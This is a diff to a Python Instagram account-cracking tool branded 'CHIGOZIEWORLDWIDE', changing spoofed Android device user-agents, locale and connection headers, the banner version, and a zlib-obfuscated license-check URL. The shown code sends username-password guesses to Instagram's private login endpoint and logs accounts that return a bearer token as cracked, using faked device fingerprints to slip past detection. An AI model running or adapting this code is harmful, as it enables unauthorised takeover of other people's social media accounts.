@@ -101,7 +101,7 @@ O='\033[38;2;255;127;0;1m' #ORANGE
 C='\033[0m' #CLEAR
 B='\033[94m'
 N = '\x1b[0m' # WARNA MATI
-USN="Mozilla/5.0 (Linux; Android 8.1.0; ASUS_A001D Build/OPM1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36 Instagram 309.1.0.41.113 Android (27/8.1.0; 480dpi; 1080x2136; asus; ASUS_A001D; ASUS_A001D_2; qcom; en_GB; 541635876)"
+USN="Mozilla/5.0 (Linux; Android 11; CMA-LX1 Build/HONORCMA-L41CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Instagram 250.0.0.21.109 Android (30/11; 320dpi; 720x1552; HONOR; CMA-LX1; HNCMA-Q; qcom; en_US; 394071250)"
 internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
 method=[]
 s=requests.Session()
@@ -133,7 +133,7 @@ def banner():
 ║ Creator  : CHIGOZIEWORLDWIDE             ║
 ║ Github   : CHIG0ZIEWORLDWIDE             ║
 ║ WhatsApp : +2348069472717                ║
-║ Version  : 12.0                          ║
+║ Version  : 11.0                          ║
 ║ FILENAME : COX                           ║
 ╚══════════════════════════════════════════╝ """)
 def loadinglisen():
@@ -244,7 +244,7 @@ class instagram:
 ║ Creator  : CHIGOZIEWORLDWIDE             ║
 ║ Github   : CHIG0ZIEWORLDWIDE             ║
 ║ WhatsApp : +2348069472717                ║
-║ Version  : 12.0                          ║
+║ Version  : 11.0                          ║
 ║ FILENAME : COX                           ║
 ╚══════════════════════════════════════════╝ 
 
@@ -339,7 +339,7 @@ class instagram:
 		self.abc = random.randint(75,115)
 		ponid=random.randint(30000,60000)
 		andro=random.randint(9,14)
-		xp='Instagram {}.0.0.{}.{} Android ({}/{}; 480dpi; 1080x2136; asus; ASUS_A001D; ASUS_A001D_2; qcom; en_US; 541635876)'.format(self.anc,self.apc,self.abc,self.xyz,self.Android_Version(andro),ponid)
+		xp='Instagram {}.0.0.{}.{} Android ({}/{}; 320dpi; 720x1552; HONOR; CMA-LX1; HNCMA-Q; qcom; en_GB; 394071250)'.format(self.anc,self.apc,self.abc,self.xyz,self.Android_Version(andro),ponid)
 		return random.choice([xp])
 	def vers(self):
 		igv=("187.0.0.32.120,187.0.0.32.120,169.3.0.30.135,169.3.0.30.135,81.0.0.15.91,81.0.0.15.91,71.0.0.18.102,71.0.0.18.102,81.0.0.15.91,71.0.0.18.102")
@@ -617,7 +617,7 @@ class instagram:
                     }
                  }
 				self.sign = 'params='+ urllib.parse.quote(str(self.data_thread)) +'&bk_client_context={"bloks_version":"9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6","styles_id":"instagram"}&bloks_versioning_id=9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6'
-				self.head = {'user-agent': self.ua_ran(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'connection': 'keep-alive', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-app-locale': 'en_UA', 'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-device-locale': 'en_US', 'x-ig-android-id': self.all_configs['data']['device_id'], 'x-ig-mapped-locale': 'en_US', 'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()), 'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 4000)), 'x-ig-device-id': self.all_configs['data']['uuid'], 'x-bloks-version-id': '9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6', 'x-ig-timezone-offset': str(-time.timezone), 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTv10=', 'x-pigeon-session-id': f'UFS-{self.all_configs["data"]["uuid"]}-0', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'x-bloks-is-layout-rtl': 'false', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Host': 'i.instagram.com', 'x-fb-http-engine': 'Liger', 'x-ig-family-device-id': self.all_configs['data']['uuid'], 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True', 'x-fb-connection-type': 'WIFI'}
+				self.head = {'user-agent': self.ua_ran(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'connection': 'keep-alive', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-app-locale': 'en_GB', 'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-device-locale': 'en_GB', 'x-ig-android-id': self.all_configs['data']['device_id'], 'x-ig-mapped-locale': 'en_GB', 'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()), 'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 4000)), 'x-ig-device-id': self.all_configs['data']['uuid'], 'x-bloks-version-id': '9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6', 'x-ig-timezone-offset': str(-time.timezone), 'x-ig-connection-type': 'unknown', 'x-ig-capabilities': '3brTv10=', 'x-pigeon-session-id': f'UFS-{self.all_configs["data"]["uuid"]}-0', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'x-bloks-is-layout-rtl': 'false', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Host': 'i.instagram.com', 'x-fb-http-engine': 'Liger', 'x-ig-family-device-id': self.all_configs['data']['uuid'], 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True', 'x-fb-connection-type': 'unknown'}
 				xnxx=ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.sign, headers=self.head, allow_redirects = True)
 				if 'Bearer IGT:2:' in str(xnxx.text.replace('\\','')):
 					success.append(user)
@@ -749,7 +749,7 @@ def Line():
 	linex()
 	print("\033[1;97m[+] YOUR KEY : \033[0;92m%s"%(id))
 	try:
-		xn = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd7w\x8e\x0c\xf1\xf0\xf73\x04\x00w\xb1\x08\xa5')
+		xn = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/H,.IM\xca\xcc\xd3K\xce\xcf\xd5/J,\xd77\xcb\xf4\xf0\xcb\xf4\xadL\x02\x00\xcf\xa8\x0b\xfd')
 		TIME = requests.get(xn).text
 		if id in TIME:
 			print("\033[1;97m[+] LICENSED KEY APPROVED SUCCESSFULLY")
